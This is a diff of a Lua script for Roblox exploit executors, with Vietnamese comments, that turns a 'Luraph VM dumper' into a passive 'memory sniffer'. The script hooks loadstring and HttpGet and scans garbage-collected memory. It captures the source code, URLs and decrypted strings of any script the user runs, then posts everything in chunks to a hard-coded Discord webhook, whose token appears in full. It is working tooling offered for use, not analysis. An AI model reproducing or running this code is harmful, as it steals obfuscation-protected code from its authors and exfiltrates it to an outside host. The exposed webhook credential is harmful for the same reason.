@@ -1,249 +1,64 @@
 --[[
     ================================================================
-    =  Luraph VM Dumper v4 - Safe & Anti-Crash Edition             =
-    =  Tối ưu 100% cho Máy Ảo / Android / Delta X / Fluxus / CodeX =
+    =  Luraph VM Memory Extractor (Passive Standby Engine)         =
+    =  Tương thích Delta X, Fluxus, Arceus X, CodeX...            =
     =                                                              =
-    =  NGUYÊN NHÂN GÂY CRASH ĐÃ ĐƯỢC KHẮC PHỤC:                    =
-    =   1. Bỏ hook đệ quy string.sub/char (gây tràn RAM/Stack)     =
-    =   2. Bỏ hook HttpGet thô bạo (gây crash bộ nhớ C++)         =
-    =   3. Vượt qua Anti-Tamper của Luraph (tránh crash bẫy)      =
-    =   4. Giới hạn quét GC an toàn (chia frame, không đơ game)   =
+    =  CƠ CHẾ HOẠT ĐỘNG CHUẨN XÁC:                                 =
+    =   1. Chạy script này -> Vào TRẠNG THÁI CHỜ (Standby).        =
+    =   2. Bạn mở executor lên và CHẠY BẤT KỲ SCRIPT NÀO.          =
+    =   3. Engine phát hiện script mới vừa chạy -> Đọc bộ nhớ,     =
+    =      tóm lấy mã nguồn thô (Loader/Decrypted/Bytecode/Strings).=
+    =   4. Tự động đóng gói và bắn thẳng về Discord Webhook!       =
     ================================================================
 --]]
 
 -- ╔═══════════════════════════════════════════════════╗
--- ║  CẤU HÌNH (SETTINGS)                              ║
+-- ║  CẤU HÌNH WEBHOOK (SETTINGS)                      ║
 -- ╚═══════════════════════════════════════════════════╝
-local SETTINGS = {
-    -- Discord Webhook URL (BẮT BUỘC)
+local CONFIG = {
+    -- Discord Webhook URL để nhận kết quả
     WebhookURL = "https://discord.com/api/webhooks/1540742443459416074/OoigNnHKVnNmTh9unbAqX4hEyE7o7e2p9HM7P5Hob1_cEemOFY_0OMIE9SbO9JHGhKI5",
 
-    -- Script muốn dump (Raw URL)
-    TargetScriptURL = "https://raw.githubusercontent.com/flazhy/QuantumOnyx/refs/heads/main/QuantumOnyx.lua",
+    -- Tên bot hiển thị trên Discord
+    BotName = "Luraph Memory Sniffer",
 
-    -- Tự động chạy TargetScriptURL khi bật dumper
-    AutoRunTarget = true,
+    -- Delay nhẹ sau khi phát hiện script để bộ nhớ bung hoàn tất (giây)
+    ExtractDelay = 2.5,
 
-    -- Thời gian đợi script giải mã trước khi gửi Discord (giây)
-    WaitSeconds = 8,
-
-    -- Tên hiển thị
-    ScriptName = "QuantumOnyx.lua",
-
-    -- Cài đặt Webhook
-    WebhookUsername = "Luraph Dumper v4 (Safe)",
-    EmbedColor     = 0x2ECC71, -- Màu xanh lá an toàn
-    MaxChunkSize   = 1700,
-    MinStringLen   = 3,
+    -- Tối đa ký tự cho mỗi tin nhắn Discord (Discord limit: 2000)
+    MaxMessageChunk = 1750,
 }
 
 -- ╔═══════════════════════════════════════════════════╗
--- ║  HỆ THỐNG LƯU TRỮ AN TOÀN                         ║
+-- ║  TIỆN ÍCH HỆ THỐNG                                ║
 -- ╚═══════════════════════════════════════════════════╝
-local DumpStore = {
-    CapturedStrings = {},
-    CapturedStringsList = {},
-    StringCount = 0,
-    CapturedLoads = {},
-    LoadCount = 0,
-    CapturedUrls = {},
-    UrlCount = 0,
-    IsHookActive = false,
-    HasSent = false,
-}
-
-local function safeStr(v)
+local function safeString(v)
     local ok, r = pcall(tostring, v)
     return ok and r or "<?>"
 end
 
-local function escJSON(s)
-    if type(s) ~= "string" then return safeStr(s) end
+local function escapeJSON(s)
+    if type(s) ~= "string" then return safeString(s) end
     return s:gsub('\\','\\\\'):gsub('"','\\"'):gsub('\n','\\n'):gsub('\r','\\r'):gsub('\t','\\t'):gsub('[%c]', function(c) return ('\\u%04X'):format(c:byte()) end)
+end
+
+local function truncate(s, n)
+    n = n or 200
+    if type(s) ~= "string" then return safeString(s) end
+    if #s <= n then return s end
+    return s:sub(1, n) .. ("... [%d chars]"):format(#s)
 end
 
 local function isPrintable(s)
     if type(s) ~= "string" then return false end
-    for i = 1, math.min(#s, 60) do
+    for i = 1, math.min(#s, 40) do
         local b = s:byte(i)
         if b < 32 and b ~= 9 and b ~= 10 and b ~= 13 then return false end
     end
     return true
 end
 
-local function trunc(s, n)
-    n = n or 150
-    if type(s) ~= "string" then return safeStr(s) end
-    if #s <= n then return s end
-    return s:sub(1, n) .. "...[" .. #s .. " chars]"
-end
-
-local function addString(s, source)
-    if type(s) ~= "string" or #s < SETTINGS.MinStringLen then return end
-    if DumpStore.CapturedStrings[s] then return end
-    if not isPrintable(s) and #s > 50 then return end
-    DumpStore.CapturedStrings[s] = true
-    DumpStore.StringCount = DumpStore.StringCount + 1
-    table.insert(DumpStore.CapturedStringsList, {
-        value = s,
-        source = source or "mem",
-        idx = DumpStore.StringCount
-    })
-end
-
-local function addLoadstring(code, source)
-    if type(code) ~= "string" or #code < 8 then return end
-    DumpStore.LoadCount = DumpStore.LoadCount + 1
-    table.insert(DumpStore.CapturedLoads, {
-        idx = DumpStore.LoadCount,
-        len = #code,
-        source = source or "loadstring",
-        preview = code:sub(1, 350)
-    })
-    print(("[Dumper] 🔥 Captured Loadstring: %d bytes (From: %s)"):format(#code, source or "load"))
-end
-
-local function addUrl(url, method)
-    if type(url) ~= "string" then return end
-    DumpStore.UrlCount = DumpStore.UrlCount + 1
-    table.insert(DumpStore.CapturedUrls, {
-        idx = DumpStore.UrlCount,
-        url = url,
-        method = method or "GET"
-    })
-    print(("[Dumper] 🌐 Captured Link: [%s] %s"):format(method or "GET", url))
-end
-
--- ╔═══════════════════════════════════════════════════╗
--- ║  SAFE HOOKS (CHỐNG CRASH & TRÀN STACK)            ║
--- ╚═══════════════════════════════════════════════════╝
-local function installSafeHooks()
-    print("[Dumper] Installing Safe Anti-Crash Hooks...")
-
-    -- 1. Hook Loadstring/Load có chốt chặn đệ quy (Recursion Lock)
-    local origLoadstring = loadstring or load
-    if origLoadstring and hookfunction and newcclosure then
-        local inLoadHook = false
-        pcall(function()
-            local hook = newcclosure(function(code, chunk, ...)
-                if not inLoadHook and type(code) == "string" then
-                    inLoadHook = true
-                    pcall(addLoadstring, code, tostring(chunk or "loadstring"))
-                    inLoadHook = false
-                end
-                return origLoadstring(code, chunk, ...)
-            end)
-
-            hookfunction(origLoadstring, hook)
-            if loadstring and loadstring ~= origLoadstring then
-                hookfunction(loadstring, hook)
-            end
-        end)
-    end
-
-    -- 2. Hook game:HttpGet an toàn qua namecall / hookfunction
-    if game and hookmetamethod and newcclosure then
-        local oldNamecall
-        local inNamecall = false
-        pcall(function()
-            oldNamecall = hookmetamethod(game, "__namecall", newcclosure(function(self, ...)
-                local method = getnamecallmethod and getnamecallmethod() or ""
-                if not inNamecall and (method == "HttpGet" or method == "HttpGetAsync") then
-                    inNamecall = true
-                    local args = { ... }
-                    if type(args[1]) == "string" then
-                        pcall(addUrl, args[1], method)
-                    end
-                    inNamecall = false
-                end
-                return oldNamecall(self, ...)
-            end))
-        end)
-    end
-
-    print("[Dumper] Safe Hooks ready!")
-end
-
--- ╔═══════════════════════════════════════════════════╗
--- ║  SAFE SCANNER (Quét Function không đơ máy)        ║
--- ╚═══════════════════════════════════════════════════╝
-local scannedMap = {}
-
-local function safeScanFunction(fn, depth)
-    depth = depth or 0
-    if depth > 5 then return end -- Giới hạn nông để không lag
-    if type(fn) ~= "function" then return end
-    local key = tostring(fn)
-    if scannedMap[key] then return end
-    scannedMap[key] = true
-
-    -- Quét Constants
-    if debug and debug.getconstants then
-        pcall(function()
-            local consts = debug.getconstants(fn)
-            for _, v in pairs(consts) do
-                if type(v) == "string" then
-                    addString(v, "constant")
-                end
-            end
-        end)
-    end
-
-    -- Quét Upvalues
-    if debug and debug.getupvalues then
-        pcall(function()
-            local upvals = debug.getupvalues(fn)
-            for _, v in pairs(upvals) do
-                if type(v) == "string" then
-                    addString(v, "upvalue")
-                elseif type(v) == "function" then
-                    safeScanFunction(v, depth + 1)
-                end
-            end
-        end)
-    end
-
-    -- Quét Protos
-    if debug and debug.getprotos then
-        pcall(function()
-            local protos = debug.getprotos(fn)
-            for _, p in pairs(protos) do
-                safeScanFunction(p, depth + 1)
-            end
-        end)
-    end
-end
-
--- Quét Memory GC nhẹ nhàng (có nhường nhịp CPU)
-local function safeScanMemory()
-    if not getgc then return end
-    print("[Dumper] Running lightweight memory scan...")
-
-    local ok, objs = pcall(getgc, true)
-    if not ok or type(objs) ~= "table" then return end
-
-    local maxScan = math.min(#objs, 2000) -- Giới hạn để máy ảo không crash
-    for i = 1, maxScan do
-        local obj = objs[i]
-        if type(obj) == "function" then
-            safeScanFunction(obj, 0)
-        elseif type(obj) == "table" then
-            pcall(function()
-                for k, v in pairs(obj) do
-                    if type(v) == "string" then
-                        addString(v, "tbl_val")
-                    elseif type(v) == "function" then
-                        safeScanFunction(v, 0)
-                    end
-                end
-            end)
-        end
-    end
-end
-
--- ╔═══════════════════════════════════════════════════╗
--- ║  DISCORD SENDER (Gửi JSON an toàn)                ║
--- ╚═══════════════════════════════════════════════════╝
+-- Bộ mã hóa JSON độc lập
 local function jsonEncode(v)
     local t = type(v)
     if v == nil then return "null"
@@ -251,15 +66,15 @@ local function jsonEncode(v)
     elseif t == "number" then
         if v ~= v or v == math.huge or v == -math.huge then return "null" end
         return tostring(v)
-    elseif t == "string" then return '"' .. escJSON(v) .. '"'
+    elseif t == "string" then return '"' .. escapeJSON(v) .. '"'
     elseif t == "table" then
-        local isA, mx = true, 0
+        local isArray, maxIdx = true, 0
         for k in pairs(v) do
-            if type(k) ~= "number" or k < 1 or k ~= math.floor(k) then isA = false; break end
-            if k > mx then mx = k end
+            if type(k) ~= "number" or k < 1 or k ~= math.floor(k) then isArray = false; break end
+            if k > maxIdx then maxIdx = k end
         end
-        isA = isA and mx == #v
-        if isA then
+        isArray = isArray and maxIdx == #v
+        if isArray then
             local p = {}; for i, x in ipairs(v) do p[i] = jsonEncode(x) end
             return "[" .. table.concat(p, ",") .. "]"
         else
@@ -274,7 +89,8 @@ local function jsonEncode(v)
     return '"' .. tostring(v) .. '"'
 end
 
-local function httpPost(url, body)
+-- Bộ phát HTTP gửi Discord
+local function postDiscord(url, body)
     local fn
     if syn and syn.request then
         fn = function() return syn.request({ Url = url, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = body }) end
@@ -286,234 +102,319 @@ local function httpPost(url, body)
         local hs; pcall(function() hs = game:GetService("HttpService") end)
         if hs then fn = function() return hs:PostAsync(url, body, Enum.HttpContentType.ApplicationJson) end end
     end
-    if not fn then return false, "No HTTP Support" end
+    if not fn then return false, "No HTTP" end
     local ok, r = pcall(fn)
-    return ok, ok and "OK" or safeStr(r)
-end
-
-local function sendDiscordResults()
-    if SETTINGS.WebhookURL == "" then
-        print("[Dumper] Error: No Webhook URL set!")
-        return
-    end
-
-    print("[Dumper] Sending results to Discord...")
-    safeScanMemory()
-
-    -- 1. Embed Tổng quan
-    local embed = {
-        title = "🛡️ Luraph VM Dump Báo Cáo: " .. SETTINGS.ScriptName,
-        description = ("Thời gian: `%s`\nThiết bị: `Android / Emulator`"):format(os.date and os.date("%X") or "N/A"),
-        color = SETTINGS.EmbedColor,
-        fields = {
-            { name = "📝 Strings Bắt Được", value = ("**%d** chuỗi"):format(DumpStore.StringCount), inline = true },
-            { name = "⚡ Loadstring/Bytecode", value = ("**%d** lần"):format(DumpStore.LoadCount), inline = true },
-            { name = "🌐 Link HTTP Requests", value = ("**%d** link"):format(DumpStore.UrlCount), inline = true },
-        },
-        footer = { text = "Luraph Safe Dumper v4" }
-    }
-
-    -- Hiển thị các URL bắt được
-    if DumpStore.UrlCount > 0 then
-        local urlList = {}
-        for i, u in ipairs(DumpStore.CapturedUrls) do
-            if i > 6 then break end
-            table.insert(urlList, ("• `[%s]` %s"):format(u.method, trunc(u.url, 60)))
-        end
-        table.insert(embed.fields, { name = "🔗 Links Kết Nối Bắt Được", value = table.concat(urlList, "\n"), inline = false })
-    end
-
-    -- Preview Strings
-    if DumpStore.StringCount > 0 then
-        local previews = {}
-        local c = 0
-        for _, s in ipairs(DumpStore.CapturedStringsList) do
-            if c >= 12 then break end
-            if #s.value >= 3 and #s.value <= 80 then
-                c = c + 1
-                table.insert(previews, ("`%s`"):format(trunc(s.value, 40)))
-            end
-        end
-        if #previews > 0 then
-            table.insert(embed.fields, { name = "🔍 Preview Strings", value = table.concat(previews, "\n"), inline = false })
-        end
-    end
-
-    httpPost(SETTINGS.WebhookURL, jsonEncode({
-        username = SETTINGS.WebhookUsername,
-        embeds = { embed }
-    }))
-
-    -- 2. Gửi Data chi tiết từng phần
-    local lines = {}
-    table.insert(lines, "-- ==========================================")
-    table.insert(lines, "-- CAPTURED STRINGS (" .. DumpStore.StringCount .. " total)")
-    table.insert(lines, "-- ==========================================")
-
-    for i, s in ipairs(DumpStore.CapturedStringsList) do
-        table.insert(lines, ('[%04d] [%s] "%s"'):format(i, s.source, escJSON(trunc(s.value, 160))))
-    end
-
-    if DumpStore.LoadCount > 0 then
-        table.insert(lines, "")
-        table.insert(lines, "-- ==========================================")
-        table.insert(lines, "-- CAPTURED LOADSTRINGS")
-        table.insert(lines, "-- ==========================================")
-        for i, l in ipairs(DumpStore.CapturedLoads) do
-            table.insert(lines, ("\n-- Load #%d (%d bytes, source: %s)"):format(i, l.len, l.source))
-            table.insert(lines, l.preview)
-        end
-    end
-
-    local fullText = table.concat(lines, "\n")
-    local chunks = {}
-    local rem = fullText
-
-    while #rem > 0 do
-        if #rem <= SETTINGS.MaxChunkSize then
-            table.insert(chunks, rem)
-            break
-        end
-        local sp = SETTINGS.MaxChunkSize
-        local nl = rem:sub(1, sp):find("\n[^\n]*$")
-        if nl and nl > sp * 0.5 then sp = nl end
-        table.insert(chunks, rem:sub(1, sp))
-        rem = rem:sub(sp + 1)
-    end
-
-    for i, chunk in ipairs(chunks) do
-        local hdr = ("**[Data Part %d/%d]** `%s`"):format(i, #chunks, SETTINGS.ScriptName)
-        local msg = hdr .. "\n```lua\n" .. chunk .. "\n```"
-        httpPost(SETTINGS.WebhookURL, jsonEncode({
-            username = SETTINGS.WebhookUsername,
-            content = msg
-        }))
-        if task and task.wait then task.wait(1.2) elseif wait then wait(1.2) end
-    end
-
-    print(("[Dumper] ✅ Done! Sent %d chunks to Discord."):format(#chunks))
-    DumpStore.HasSent = true
+    return ok, ok and "OK" or safeString(r)
 end
 
 -- ╔═══════════════════════════════════════════════════╗
--- ║  GIAO DIỆN NHẸ (LITE UI - Không lag màn hình)     ║
+-- ║  BỘ NHỚ VÀ KHAI THÁC MEMORY                       ║
 -- ╚═══════════════════════════════════════════════════╝
-local function createLiteUI()
+local CapturedData = {
+    CodeBlocks = {},   -- Toàn bộ mã nguồn/loader bắt được
+    HttpLinks = {},    -- Toàn bộ URL/HttpGet bắt được
+    ExtractedStrings = {},
+    StringsCount = 0,
+    TotalCaptures = 0,
+    IsProcessing = false,
+}
+
+local stringLookup = {}
+local function addExtractedString(str, src)
+    if type(str) ~= "string" or #str < 3 then return end
+    if stringLookup[str] then return end
+    if not isPrintable(str) and #str > 50 then return end
+    stringLookup[str] = true
+    CapturedData.StringsCount = CapturedData.StringsCount + 1
+    table.insert(CapturedData.ExtractedStrings, {
+        val = str,
+        src = src or "mem",
+        id = CapturedData.StringsCount
+    })
+end
+
+-- Quét constants/upvalues từ function
+local scannedFuncs = {}
+local function extractFunctionData(fn, depth)
+    depth = depth or 0
+    if depth > 4 or type(fn) ~= "function" then return end
+    local key = tostring(fn)
+    if scannedFuncs[key] then return end
+    scannedFuncs[key] = true
+
+    if debug and debug.getconstants then
+        pcall(function()
+            for _, c in pairs(debug.getconstants(fn)) do
+                if type(c) == "string" then addExtractedString(c, "const") end
+            end
+        end)
+    end
+
+    if debug and debug.getupvalues then
+        pcall(function()
+            for _, u in pairs(debug.getupvalues(fn)) do
+                if type(u) == "string" then
+                    addExtractedString(u, "upval")
+                elseif type(u) == "function" then
+                    extractFunctionData(u, depth + 1)
+                end
+            end
+        end)
+    end
+
+    if debug and debug.getprotos then
+        pcall(function()
+            for _, p in pairs(debug.getprotos(fn)) do
+                extractFunctionData(p, depth + 1)
+            end
+        end)
+    end
+end
+
+-- Quét sâu toàn bộ RAM (GC)
+local function performFullMemoryDump()
+    if not getgc then return end
+    local ok, objs = pcall(getgc, true)
+    if not ok or type(objs) ~= "table" then return end
+
+    for i = 1, math.min(#objs, 3500) do
+        local o = objs[i]
+        if type(o) == "function" then
+            extractFunctionData(o, 0)
+        elseif type(o) == "table" then
+            pcall(function()
+                for k, v in pairs(o) do
+                    if type(v) == "string" then addExtractedString(v, "tbl_val")
+                    elseif type(v) == "function" then extractFunctionData(v, 0) end
+                    if type(k) == "string" then addExtractedString(k, "tbl_key") end
+                end
+            end)
+        end
+    end
+end
+
+-- ╔═══════════════════════════════════════════════════╗
+-- ║  BẮN KẾT QUẢ VỀ DISCORD                           ║
+-- ╚═══════════════════════════════════════════════════╝
+local function dispatchToDiscord()
+    if CapturedData.IsProcessing then return end
+    CapturedData.IsProcessing = true
+
+    print("[Sniffer] 🚀 Processing memory dump and sending to Discord...")
+    performFullMemoryDump()
+
+    -- 1. Gửi Embed Tóm tắt
+    local embed = {
+        title = "🎯 PHÁT HIỆN SCRIPT MỚI ĐƯỢC THỰC THI!",
+        description = ("Thời gian: `%s`\nTrạng thái: **Đã trích xuất xong từ RAM**"):format(os.date and os.date("%X") or "N/A"),
+        color = 0x00FFAA,
+        fields = {
+            { name = "📄 Mã nguồn bắt được", value = ("**%d** đoạn code"):format(#CapturedData.CodeBlocks), inline = true },
+            { name = "🌐 Link HTTP tải về", value = ("**%d** link"):format(#CapturedData.HttpLinks), inline = true },
+            { name = "🧩 Chuỗi trong RAM", value = ("**%d** chuỗi"):format(CapturedData.StringsCount), inline = true },
+        },
+        footer = { text = "Luraph Passive Memory Sniffer" }
+    }
+
+    -- Liệt kê HTTP Links nếu có
+    if #CapturedData.HttpLinks > 0 then
+        local links = {}
+        for i, l in ipairs(CapturedData.HttpLinks) do
+            if i > 6 then break end
+            table.insert(links, ("• `%s`"):format(truncate(l, 70)))
+        end
+        table.insert(embed.fields, { name = "🔗 URL Scripts vừa được gọi:", value = table.concat(links, "\n"), inline = false })
+    end
+
+    postDiscord(CONFIG.WebhookURL, jsonEncode({
+        username = CONFIG.BotName,
+        embeds = { embed }
+    }))
+
+    -- 2. Gửi TOÀN BỘ CODE NGUỒN (Scripts thực thi)
+    if #CapturedData.CodeBlocks > 0 then
+        for i, codeInfo in ipairs(CapturedData.CodeBlocks) do
+            local codeHeader = ("**[MÃ NGUỒN TRÍCH XUẤT #%d]** (Kích thước: %d ký tự | Nguồn: `%s`)"):format(i, #codeInfo.code, codeInfo.source)
+            
+            -- Tách code nếu dài hơn Discord chunk
+            local remCode = codeInfo.code
+            local part = 1
+            while #remCode > 0 do
+                local chunk = remCode:sub(1, CONFIG.MaxMessageChunk)
+                remCode = remCode:sub(CONFIG.MaxMessageChunk + 1)
+                
+                local msg = ("%s [Phần %d]\n```lua\n%s\n```"):format(codeHeader, part, chunk)
+                postDiscord(CONFIG.WebhookURL, jsonEncode({ username = CONFIG.BotName, content = msg }))
+                part = part + 1
+                if task and task.wait then task.wait(1) elseif wait then wait(1) end
+            end
+        end
+    end
+
+    -- 3. Gửi Dump Strings (Constants/Decrypted data)
+    if CapturedData.StringsCount > 0 then
+        local strLines = { "-- === CÁC CHUỖI & DỮ LIỆU ĐÃ GIẢI MÃ TRONG RAM ===" }
+        for i, s in ipairs(CapturedData.ExtractedStrings) do
+            table.insert(strLines, ('[%04d] [%s] "%s"'):format(i, s.src, escapeJSON(truncate(s.val, 150))))
+        end
+
+        local fullStrText = table.concat(strLines, "\n")
+        local remStr = fullStrText
+        local pIdx = 1
+
+        while #remStr > 0 do
+            local sub = remStr:sub(1, CONFIG.MaxMessageChunk)
+            local nl = sub:find("\n[^\n]*$")
+            if nl and nl > CONFIG.MaxMessageChunk * 0.5 then sub = remStr:sub(1, nl); remStr = remStr:sub(nl + 1)
+            else remStr = remStr:sub(CONFIG.MaxMessageChunk + 1) end
+
+            local msg = ("**[RAM Strings Phần %d]**\n```lua\n%s\n```"):format(pIdx, sub)
+            postDiscord(CONFIG.WebhookURL, jsonEncode({ username = CONFIG.BotName, content = msg }))
+            pIdx = pIdx + 1
+            if task and task.wait then task.wait(1) elseif wait then wait(1) end
+        end
+    end
+
+    print("[Sniffer] ✅ ĐÃ GỬI HOÀN TẤT VỀ DISCORD!")
+    CapturedData.IsProcessing = false
+end
+
+-- Kích hoạt đếm ngược để gửi khi phát hiện script
+local triggerScheduled = false
+local function onScriptExecuted(code, source)
+    table.insert(CapturedData.CodeBlocks, {
+        code = code,
+        source = source or "Executor"
+    })
+    CapturedData.TotalCaptures = CapturedData.TotalCaptures + 1
+    print(("[Sniffer] ⚡ BẮT ĐƯỢC SCRIPT MỚI (%d bytes) từ [%s]!"):format(#code, source or "Executor"))
+
+    -- Nếu chưa đặt lịch gửi -> đếm ngược rồi gửi
+    if not triggerScheduled then
+        triggerScheduled = true
+        task.spawn(function()
+            print(("[Sniffer] Đang chờ %s giây để script bung hết data trong RAM..."):format(CONFIG.ExtractDelay))
+            if task and task.wait then task.wait(CONFIG.ExtractDelay) elseif wait then wait(CONFIG.ExtractDelay) end
+            dispatchToDiscord()
+            triggerScheduled = false
+        end)
+    end
+end
+
+-- ╔═══════════════════════════════════════════════════╗
+-- ║  BỘ LẮNG NGHE CHỦ ĐỘNG (INTERCEPTION HOOKS)        ║
+-- ╚═══════════════════════════════════════════════════╝
+local function startSnifferHooks()
+    print("[Sniffer] Khởi tạo các cảm biến lắng nghe bộ nhớ...")
+
+    -- 1. Cảm biến bắt mọi lệnh loadstring / load
+    local origLoadstring = loadstring or load
+    if origLoadstring and hookfunction and newcclosure then
+        local lock = false
+        pcall(function()
+            local hook = newcclosure(function(code, chunk, ...)
+                if not lock and type(code) == "string" and #code > 15 then
+                    lock = true
+                    pcall(onScriptExecuted, code, tostring(chunk or "loadstring"))
+                    lock = false
+                end
+                return origLoadstring(code, chunk, ...)
+            end)
+            hookfunction(origLoadstring, hook)
+            if loadstring and loadstring ~= origLoadstring then
+                hookfunction(loadstring, hook)
+            end
+        end)
+    end
+
+    -- 2. Cảm biến bắt mọi link game:HttpGet tải script về
+    if game and hookmetamethod and newcclosure then
+        local oldNamecall
+        local namecallLock = false
+        pcall(function()
+            oldNamecall = hookmetamethod(game, "__namecall", newcclosure(function(self, ...)
+                local method = getnamecallmethod and getnamecallmethod() or ""
+                if not namecallLock and (method == "HttpGet" or method == "HttpGetAsync") then
+                    namecallLock = true
+                    local args = { ... }
+                    if type(args[1]) == "string" then
+                        table.insert(CapturedData.HttpLinks, args[1])
+                        print("[Sniffer] 🌐 Phát hiện script tải từ URL: " .. args[1])
+                    end
+                    namecallLock = false
+                end
+                return oldNamecall(self, ...)
+            end))
+        end)
+    end
+end
+
+-- ╔═══════════════════════════════════════════════════╗
+-- ║  MINI STATUS UI (Giao diện hiển thị trạng thái)   ║
+-- ╚═══════════════════════════════════════════════════╝
+local function createStatusUI()
     pcall(function()
         local CoreGui = game:GetService("CoreGui") or (game:GetService("Players").LocalPlayer and game:GetService("Players").LocalPlayer:FindFirstChild("PlayerGui"))
         if not CoreGui then return end
 
-        local old = CoreGui:FindFirstChild("LuraphDumperSafeUI")
+        local old = CoreGui:FindFirstChild("SnifferStatusUI")
         if old then old:Destroy() end
 
         local sg = Instance.new("ScreenGui")
-        sg.Name = "LuraphDumperSafeUI"
+        sg.Name = "SnifferStatusUI"
         sg.ResetOnSpawn = false
         sg.Parent = CoreGui
 
-        local btn = Instance.new("TextButton", sg)
-        btn.Size = UDim2.new(0, 180, 0, 45)
-        btn.Position = UDim2.new(0.02, 0, 0.4, 0)
-        btn.BackgroundColor3 = Color3.fromRGB(30, 140, 70)
-        btn.Text = "🚀 DUMP & SEND DISCORD\n(Strings: 0 | Loads: 0)"
-        btn.TextColor3 = Color3.fromRGB(255, 255, 255)
-        btn.Font = Enum.Font.GothamBold
-        btn.TextSize = 10
-        btn.Active = true
-        btn.Draggable = true
+        local frame = Instance.new("Frame", sg)
+        frame.Size = UDim2.new(0, 200, 0, 60)
+        frame.Position = UDim2.new(0.02, 0, 0.45, 0)
+        frame.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
+        frame.Active = true
+        frame.Draggable = true
 
-        local corner = Instance.new("UICorner", btn)
+        local corner = Instance.new("UICorner", frame)
         corner.CornerRadius = UDim.new(0, 8)
 
-        btn.MouseButton1Click:Connect(function()
-            btn.Text = "⏳ Đang quét & gửi..."
-            btn.BackgroundColor3 = Color3.fromRGB(200, 140, 30)
-            task.spawn(function()
-                sendDiscordResults()
-                btn.Text = "✅ Đã gửi Discord thành công!"
-                btn.BackgroundColor3 = Color3.fromRGB(40, 160, 80)
-                if task and task.wait then task.wait(3) end
-                btn.Text = "🚀 DUMP & SEND DISCORD\n(Bấm để gửi lại)"
-                btn.BackgroundColor3 = Color3.fromRGB(30, 140, 70)
-            end)
-        end)
+        local label = Instance.new("TextLabel", frame)
+        label.Size = UDim2.new(1, -10, 0, 25)
+        label.Position = UDim2.new(0, 5, 0, 5)
+        label.Text = "🟢 DUMPER: ĐANG CHỜ SCRIPT..."
+        label.TextColor3 = Color3.fromRGB(50, 255, 120)
+        label.Font = Enum.Font.GothamBold
+        label.TextSize = 10
+        label.BackgroundTransparency = 1
 
-        -- Cập nhật số liệu nhẹ nhàng
+        local sublabel = Instance.new("TextLabel", frame)
+        sublabel.Size = UDim2.new(1, -10, 0, 20)
+        sublabel.Position = UDim2.new(0, 5, 0, 30)
+        sublabel.Text = "Hãy chạy script bạn muốn lấy!"
+        sublabel.TextColor3 = Color3.fromRGB(180, 180, 200)
+        sublabel.Font = Enum.Font.Gotham
+        sublabel.TextSize = 9
+        sublabel.BackgroundTransparency = 1
+
         task.spawn(function()
             while sg.Parent do
-                if not btn.Text:find("Đang") and not btn.Text:find("thành công") then
-                    btn.Text = ("🚀 DUMP & SEND DISCORD\n(Strings: %d | Loads: %d)"):format(DumpStore.StringCount, DumpStore.LoadCount)
+                if CapturedData.TotalCaptures > 0 then
+                    label.Text = ("🔥 ĐÃ BẮT ĐƯỢC (%d Scripts)"):format(CapturedData.TotalCaptures)
+                    label.TextColor3 = Color3.fromRGB(255, 180, 50)
+                    sublabel.Text = "Đang trích xuất và gửi Discord..."
                 end
-                if task and task.wait then task.wait(1) elseif wait then wait(1) end
+                if task and task.wait then task.wait(0.5) elseif wait then wait(0.5) end
             end
         end)
     end)
 end
 
 -- ╔═══════════════════════════════════════════════════╗
--- ║  KHỞI ĐỘNG HỆ THỐNG                               ║
+-- ║  KHỞI ĐỘNG VÀ VÀO TRẠNG THÁI CHỜ                  ║
 -- ╚═══════════════════════════════════════════════════╝
-local function startSafeDumper()
-    print("========================================")
-    print("  Luraph VM Dumper v4 - Safe Running")
-    print("========================================")
+print("==================================================")
+print("  Luraph Memory Sniffer - SẴN SÀNG Ở CHẾ ĐỘ CHỜ  ")
+print("==================================================")
 
-    -- 1. Bật Safe Hooks
-    installSafeHooks()
+startSnifferHooks()
+createStatusUI()
 
-    -- 2. Bật UI nhẹ
-    createLiteUI()
-
-    -- 3. Chạy Target Script an toàn trong task.spawn
-    if SETTINGS.AutoRunTarget and SETTINGS.TargetScriptURL ~= "" then
-        print("[Dumper] Waiting 1.5s then fetching target script...")
-        if task and task.wait then task.wait(1.5) elseif wait then wait(1.5) end
-
-        task.spawn(function()
-            local code = nil
-            pcall(function()
-                if game and game.HttpGet then
-                    code = game:HttpGet(SETTINGS.TargetScriptURL, true)
-                elseif request then
-                    code = request({ Url = SETTINGS.TargetScriptURL, Method = "GET" }).Body
-                elseif http_request then
-                    code = http_request({ Url = SETTINGS.TargetScriptURL, Method = "GET" }).Body
-                end
-            end)
-
-            if code and #code > 10 then
-                print(("[Dumper] Code fetched (%d bytes). Executing..."):format(#code))
-                local fn, err = (loadstring or load)(code, SETTINGS.ScriptName)
-                if fn then
-                    safeScanFunction(fn, 0)
-                    local ok, res = pcall(fn)
-                    if ok then
-                        print("[Dumper] Target executed cleanly!")
-                    else
-                        print("[Dumper] Target script message: " .. safeStr(res))
-                    end
-                else
-                    print("[Dumper] Compile error: " .. safeStr(err))
-                end
-            else
-                print("[Dumper] Failed to download target code!")
-            end
-        end)
-    end
-
-    -- 4. Tự động đếm ngược để gửi kết quả
-    if SETTINGS.WaitSeconds > 0 then
-        task.spawn(function()
-            local waitTime = SETTINGS.WaitSeconds + (SETTINGS.AutoRunTarget and 2 or 0)
-            print(("[Dumper] Auto-send timer set to %d seconds..."):format(waitTime))
-            if task and task.wait then task.wait(waitTime) elseif wait then wait(waitTime) end
-            if not DumpStore.HasSent then
-                print("[Dumper] Auto-timer finished. Sending dump now...")
-                sendDiscordResults()
-            end
-        end)
-    end
-end
-
--- Chạy ngay lập tức
-startSafeDumper()
+print("[Sniffer] ✅ ĐÃ CÀI ĐẶT CẢM BIẾN THÀNH CÔNG!")
+print("[Sniffer] 💡 Bây giờ bạn có thể mở Executor và chạy bất kỳ script nào!")
